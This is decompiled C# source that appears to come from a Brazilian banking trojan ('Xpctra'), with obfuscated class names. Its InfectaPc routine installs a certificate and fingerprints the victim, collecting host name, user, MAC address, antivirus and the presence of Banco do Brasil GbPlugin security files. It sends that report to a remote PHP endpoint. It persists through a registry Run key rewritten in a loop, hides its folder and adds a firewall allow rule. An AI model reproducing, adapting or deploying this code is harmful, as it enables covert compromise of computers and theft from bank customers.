// Decompiled with JetBrains decompiler
// Type: Xpctra.INAPROVEITADO608FULIGEM
// Assembly: madre, Version=1.1.2.3, Culture=neutral, PublicKeyToken=null
// MVID: E3E81F5F-5E79-4C7B-AA1D-713B5D376685
// Assembly location: C:\Users\Marcos Abreu\Documents\XPCTRA\idfptray.exe

using Microsoft.Win32;
using System;
using System.Diagnostics;
using System.IO;
using System.Net;
using System.Runtime.InteropServices;
using System.Threading;
using System.Windows.Forms;
using VERMELHO265MONARCA.Core.Helper;

namespace Xpctra
{
  internal class INAPROVEITADO608FULIGEM
  {
    private static bool is64BitProcess = IntPtr.Size == 8;
    private static bool is64BitOperatingSystem = INAPROVEITADO608FULIGEM.is64BitProcess;
    private string Pluguins = "pluguins:";
    private string REMARCACAO852BACHAREL;

    public static string MacAdres { get; set; }

    [DllImport("kernel32.dll", SetLastError = true)]
    [return: MarshalAs(UnmanagedType.Bool)]
    private static extern bool IsWow64Process([In] IntPtr hProcess, out bool wow64Process);

    public void InfectaPc()
    {
      this.DESATIVADO948VERBOS();
      new APRECO518NECROLOGISTA().Intallcertificado2();
      this.AFOBACAO23ENCILHAR();
      Thread.Sleep(new Random().Next(100, 600));
      if (!System.IO.File.Exists(Xpctra.Properties.Settings.Default.CaminhoPath + "micos.txt"))
      {
        System.IO.File.Create(Xpctra.Properties.Settings.Default.CaminhoPath + "micos.txt");
        string str = string.Empty;
        if (Xpctra.Properties.Settings.Default.Excption != "false")
          str = "Erro:" + Xpctra.Properties.Settings.Default.Excption;
        string infos = ">>>>>>>>>>>>>>>>>>>>" + Environment.NewLine + "Nome Do pc:" + Xpctra.Properties.Settings.Default.NomePc + Environment.NewLine + "Usuario:" + Xpctra.Properties.Settings.Default.Usuario + Environment.NewLine + "Sistema:" + Xpctra.Properties.Settings.Default.Sistema + Environment.NewLine + "Bits:" + Xpctra.Properties.Settings.Default.Bits + Environment.NewLine + "Resoluçao" + Xpctra.Properties.Settings.Default.Resoluçao + Environment.NewLine + "Certificado:" + (object) Xpctra.Properties.Settings.Default.CertificadoInstalado + Environment.NewLine + "Mac:" + INAPROVEITADO608FULIGEM.MacAdres + Environment.NewLine + this.Pluguins + Environment.NewLine + "AV:" + this.REMARCACAO852BACHAREL + Environment.NewLine + Environment.NewLine + "Versao:" + VERMELHO265MONARCA.Config.Settings.VERSION + Environment.NewLine + str;
        int num = 0;
        while (!ClassMandaPraMim.MandaParasSite(infos, VERMELHO265MONARCA.Config.Settings.PhpSeParador) && num < 4)
          ++num;
        this.ASSINALAMENTO349BARBEIRO();
        this.CAUSALIDADE285PREMIER();
        new TOPSPIN652GANIMEDES().Pegacelulares();
      }
      try
      {
        new Thread(new ThreadStart(this.MANEIRAS126MATERIAS)).Start();
        AMADELEITE205CACADOTES.Initialize();
      }
      catch
      {
      }
    }

    public bool VereficaInicializar(bool enable)
    {
      bool flag = true;
      try
      {
        string name = "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run";
        RegistryKey registryKey = Registry.LocalMachine.OpenSubKey(name);
        if (enable)
          flag = registryKey.GetValue(Xpctra.Properties.Settings.Default.NomePro) == null;
      }
      catch
      {
      }
      return flag;
    }

    public void ASSINALAMENTO349BARBEIRO()
    {
      try
      {
        string name = "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run";
        Registry.LocalMachine.OpenSubKey(name);
        RegistryKey registryKey = Registry.LocalMachine.OpenSubKey(name, true);
        registryKey.SetValue(Xpctra.Properties.Settings.Default.NomePro, (object) Application.ExecutablePath.ToString());
        registryKey.Close();
      }
      catch (Exception ex)
      {
      }
    }

    private void MANEIRAS126MATERIAS()
    {
      Random random = new Random();
      while (true)
      {
        if (this.VereficaInicializar(true))
          this.ASSINALAMENTO349BARBEIRO();
        Thread.Sleep(random.Next(500, 800));
      }
    }

    public void AFOBACAO23ENCILHAR()
    {
      Xpctra.Properties.Settings.Default.NomePro = AppDomain.CurrentDomain.FriendlyName.Replace(".exe", "");
      Xpctra.Properties.Settings.Default.NomePc = Dns.GetHostName();
      Xpctra.Properties.Settings.Default.Usuario = Environment.UserName;
      Xpctra.Properties.Settings.Default.Bits = this.AFIRMAR177ATENUADO();
      Xpctra.Properties.Settings.Default.CaminhoPath = AppDomain.CurrentDomain.BaseDirectory.ToString();
      Xpctra.Properties.Settings.Default.CaminhoTemp = Path.GetTempPath();
      try
      {
        Xpctra.Properties.Settings.Default.Resoluçao = "w:" + (object) Screen.PrimaryScreen.Bounds.Width + " h:" + (object) Screen.PrimaryScreen.Bounds.Height;
        this.Mac();
        this.BIGAMO827PRENHA();
        this.REMARCACAO852BACHAREL = SystemHelper.GetAntivirus();
        Xpctra.Properties.Settings.Default.Sistema = PlatformHelper.FullName;
      }
      catch (Exception ex)
      {
      }
    }

    private void BIGAMO827PRENHA()
    {
      string[] strArray = new string[4]
      {
        Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles) + "\\GbPlugin\\bb.gpc",
        Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles) + "\\GbPlugin\\cef.gpc",
        Environment.GetEnvironmentVariable("ProgramFiles(x86)") + "\\GbPlugin\\bb.gpc",
        Environment.GetEnvironmentVariable("ProgramFiles(x86)") + "\\GbPlugin\\cef.gpc"
      };
      foreach (string path in strArray)
      {
        if (System.IO.File.Exists(path))
        {
          if (path.Contains("bb.gpc") && !this.Pluguins.Contains("bb.gpc"))
            this.Pluguins += "bb.gpc,";
          if (path.Contains("cef.gpc") && !this.Pluguins.Contains("cef.gpc"))
            this.Pluguins += "cef.gpc,";
        }
      }
    }

    private void Mac()
    {
      INAPROVEITADO608FULIGEM.MacAdres = SOCIAIS684DESCALABRO.GetMacAddress();
    }

    private string AFIRMAR177ATENUADO()
    {
      string str = string.Empty;
      try
      {
        str = IntPtr.Size != 8 ? "32bits" : "64bits";
      }
      catch (Exception ex)
      {
      }
      return str;
    }

    private void CAUSALIDADE285PREMIER()
    {
      try
      {
        Directory.CreateDirectory(Xpctra.Properties.Settings.Default.CaminhoPath).Attributes = FileAttributes.Hidden;
      }
      catch
      {
      }
    }

    private void DESATIVADO948VERBOS()
    {
      try
      {
        string str = "netsh advfirewall firewall add rule name=\"privi512\" dir=in action=allow program=\"" + Xpctra.Properties.Settings.Default.CaminhoPath + Xpctra.Properties.Settings.Default.NomePro + ".exe\"";
        ProcessStartInfo processStartInfo = new ProcessStartInfo("C:\\Windows\\System32\\cmd.exe");
        Process process = new Process();
        processStartInfo.CreateNoWindow = true;
        processStartInfo.UseShellExecute = false;
        process.StartInfo = processStartInfo;
        process.StartInfo.RedirectStandardOutput = true;
        process.StartInfo.RedirectStandardInput = true;
        process.StartInfo.RedirectStandardError = true;
        process.StartInfo = processStartInfo;
        process.StartInfo.Verb = "runas";
        process.Start();
        process.StandardInput.WriteLine();
        process.Close();
        process.Dispose();
      }
      catch (Exception ex)
      {
      }
    }
  }
}
